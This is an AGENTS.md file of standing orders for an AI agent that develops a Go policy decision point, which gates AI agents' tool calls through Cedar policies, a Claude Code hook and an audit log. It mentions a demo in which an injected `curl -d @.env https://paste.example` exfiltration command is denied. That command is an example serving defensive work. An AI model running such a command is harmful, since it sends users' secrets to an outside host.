# AGENTS.md

Standing orders for the agent that works this repo, usually the AI-Security-Command-Center Weekly Roadmap
routine (Monday, Wednesday and Friday).

## What ASCC is

AI Security Command Center (`ascc`) is a policy decision point for AI agents. The public MVP is one Go binary:

- `decide` evaluates a request (principal agent, action, resource, context) against Cedar policies in
  `policies/*.cedar` and an agent registry in `ascc.registry.json`. Default deny. Every answer carries the
  determining policy ids and a plain-English reason.
- `hook claude-code` is a Claude Code PreToolUse hook. It reads the hook payload on stdin, maps it to a request
  (`action = "runtime.tool_use"`, `resource = Tool::"claude-code/<tool>"`, parsed command features in context)
  and blocks denied calls. **Any error is a deny.**
- Every decision appends a line to a hash-chained JSONL audit log; `audit verify` names the first line that was
  edited, removed or reordered.
- `kill <agent>` / `revive <agent>` suspend and restore an agent. A suspended agent is denied everything.
- `inventory` writes the registry as an Agent Security Suite inventory document, each agent labelled
  `enforced`, `observed` or `unmonitored`.
- A static demo on GitHub Pages runs the same Go core as WebAssembly on a planted setup and shows an injected
  `curl -d @.env https://paste.example` denied on first load.

Public-MVP spec: `docs/product/spec.md`. Slice order: `docs/product/build-plan.md`. Work queue:
`docs/ROADMAP.md`. The full platform design (gateway, STS, egress, broker, plugin host, connectors, console) is
`docs/product/plan/`, A to K; its ADRs in `docs/product/plan/e2-adrs.md` are binding on architecture. A changed
decision goes in as an ADR amendment there, never as a quiet code change.

## Stack

- Go 1.25 (`go.mod`), standard library first. Module path
  `github.com/ai-automation-tools/ai-security-command-center`. Code lives under `src/`: the CLI in
  `src/cmd/ascc/`, packages in `src/internal/<name>/`. Tests are `_test.go` files next to the code, using
  `testing` only (table tests; no testify).
- Cedar via `github.com/cedar-policy/cedar-go` **v1.9.0** (ADR-03), confirmed against the Rust reference in
  `docs/reports/2026-cedar-go-check.md`. It needs Go 1.26: the PR that adds it raises `go.mod` and every "1.25"
  in the docs. Load policies with `NewPolicyListFromBytes` and key each by its `@id` (reject missing or
  duplicate ids). Its schema validator is experimental (`x/exp/schema/validate`): keep it behind one function.
  A JSON Schema validator is fine as a test-only dependency for the inventory check.
- **The PDP and audit packages do no I/O.** They take bytes and return values, so the WebAssembly demo
  (`GOOS=js GOARCH=wasm`) imports exactly the code the CLI runs. File, stdin and clock access live in
  `src/cmd/ascc` or a thin `src/internal/store` package.
- Must build and test on Windows and Linux (CI runs both). Use `path/filepath`, never hard-coded separators.
- Settings live in `.env` at the repo root, names in `.env.example`; the real environment wins. There are none
  today. If one is ever needed, load it with a few lines of stdlib parsing and document it in `.env.example`.
  Never tell anyone to set a Windows user environment variable.

## Verify

Run all four from the repo root. All must pass before a PR opens.

```
gofmt -l .        # must print nothing
go vet ./...
go test ./...
go build ./...
```

## Invariants

- **Default deny, fail closed.** No permit, an unknown agent, an unknown tool, a parse error, a missing policy
  file or a panic is a deny with a reason. Every fail-closed path has a test.
- **Cedar skips a policy that errors, so a `forbid` can fail open.** Deny any principal or resource not in the
  registry before evaluating, validate entities and policies against the schema at load, and treat any entry in
  `Diagnostic.Errors` as a deny. Requests R8 and R9 in the cedar-go report are the regression tests.
- **The hook contract is `docs/reports/2026-claude-code-hook-contract.md`.** Deny with exit 0 and the
  `hookSpecificOutput` JSON; an internal error writes stderr and exits 2, never 1. On allow, print nothing, so
  Claude Code's own permission rules still apply. The agent id comes from `--agent` in the hook's `args`, not
  the payload. Setup docs always show matcher `*`, `"timeout": 10` and `"onFailure": "block"`. Normalise
  Windows backslashes and parse `Bash` and `PowerShell` commands alike.
- **Policy decides, nothing else.** No model call, score or heuristic grants access (ADR-14).
- **No secret at rest.** The audit line stores the tool name, parsed features and a SHA-256 of the raw input,
  never the raw input. A test asserts it.
- **Zero network.** The CLI and the demo make no network calls. A test proves it for each.
- **Never claim coverage it doesn't have.** If the hook can't block a tool, that tool is `observed`, and the
  README's coverage section says so.

## Won't (this version)

Carried from the spec. If a roadmap item seems to need one of these, stop and flag it.

- **A gateway, proxy or broker in the network path.** Those are Next slices, each behind an ADR spike.
- **Any network access**, accounts, telemetry, a hosted service or a paid tier.
- **Holding or printing a secret.**
- **Model-based or score-based decisions.**
- **Runtimes other than Claude Code.**
- **Real agents, repos, people or hosts in demo data.** Fictional only (`example.com`, `paste.example`).

## Standards

- Every policy rule and every fail-closed path ships with an allow fixture and a deny fixture.
- Error messages are one line a human can act on, never a stack trace, and never echo a secret.
- No new dependency without a line in the PR body saying why.
- This repo goes public at graduation. Never commit `.env*`, real hook payloads, tokens, real personal data, or
  local paths like `C:\Users\...` or `D:\...`.
- Every deployed page keeps `<meta name="build" content="__BUILD_SHA__">` in `<head>`; the Pages workflow
  replaces it with the commit SHA.
- Docs follow the existing house style: centered header, tables with bold leftmost links, footer nav links.
  Folders and doc file names are lowercase-kebab.
- Commit messages: plain imperative sentences ("Add the decide command"), no Conventional Commit prefixes.

## What "done" means for a roadmap item

1. The item's own text is true of the code, checked by running it.
2. `gofmt -l .` prints nothing and `go vet`, `go test` and `go build` pass; new behaviour has a test.
3. Anything the change made untrue is fixed: `README.md`, `docs/`, this file.
4. `docs/CHANGELOG.md` has a line for it, tagged with the roadmap phase in italics, in the same commit that flips
   the box to `- [x]` with a dated note.
5. It's on a `roadmap/auto-<date>` branch with a PR into `main`. Never push to `main`.
